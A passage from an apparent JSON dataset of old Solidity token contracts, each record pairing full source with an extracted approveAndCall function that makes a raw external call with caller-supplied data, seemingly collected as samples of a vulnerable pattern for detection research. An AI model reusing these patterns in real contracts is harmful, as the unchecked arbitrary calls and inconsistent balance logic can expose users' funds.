totalSupply = 1000000;\n name = \"Reputoken\";\n decimals = 0;\n symbol = \"RPT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15f8"
  },
  "filename": "36745.sol",
  "content": "pragma solidity ^0.4.11;\nlibrary SafeMath {\n function mul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint a, uint b) internal returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n function assert(bool assertion) internal {\n require (assertion);\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract ERC223Basic is StandardToken{\n uint public totalSupply;\n function transfer(address to, uint value);\n function transfer(address to, uint value, bytes data);\n event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);\n}\ncontract ERC223BasicToken is ERC223Basic{\n using SafeMath for uint;\n mapping(address => uint) balances;\n function transfer(address to, uint value, bytes data) {\n uint codeLength;\n assembly {\n codeLength := extcodesize(to)\n }\n balances[msg.sender] = balances[msg.sender].sub(value);\n balances[to] = balances[to].add(value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(to);\n receiver.tokenFallback(msg.sender, value, data);\n }\n Transfer(msg.sender, to, value, data);\n }\n function transfer(address to, uint value) {\n uint codeLength;\n bytes memory empty;\n assembly {\n codeLength := extcodesize(to)\n }\n balances[msg.sender] = balances[msg.sender].sub(value);\n balances[to] = balances[to].add(value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(to);\n receiver.tokenFallback(msg.sender, value, empty);\n }\n Transfer(msg.sender, to, value, empty);\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n}\ncontract ERC223ReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data);\n}\ncontract HumanERC223Token is ERC223BasicToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanERC223Token (\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract HedgeminerToken is HumanERC223Token (20000000000000000000000000, \"Hedgeminer Token\", 18, \"HMT\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15f9"
  },
  "filename": "36795.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Sogan is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.0';\n function Sogan(\n ) {\n balances[msg.sender] = 200000000;\n totalSupply = 200000000;\n name = \"Sogan\";\n decimals = 0;\n symbol = \"SOGAN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15fa"
  },
  "filename": "36797.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Robot is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.1.3';\n function Robot(\n ) {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"Robot\";\n decimals = 18;\n symbol = \"RBT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15fb"
  },
  "filename": "36815.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'V1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000;\n totalSupply = 1500000000000;\n name = \"Multicoin\";\n decimals = 8;\n symbol = \"MC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15fc"
  },
  "filename": "36831.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 18360000;\n totalSupply = 18360000;\n name = \"Texas Coin\";\n decimals = 0;\n symbol = \"TEX\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15fd"
  },
  "filename": "36836.sol",
  "content": "pragma solidity ^0.4.16;\npragma solidity ^0.4.0;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0)) oraclize_setNetwork(networkID_auto);\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + 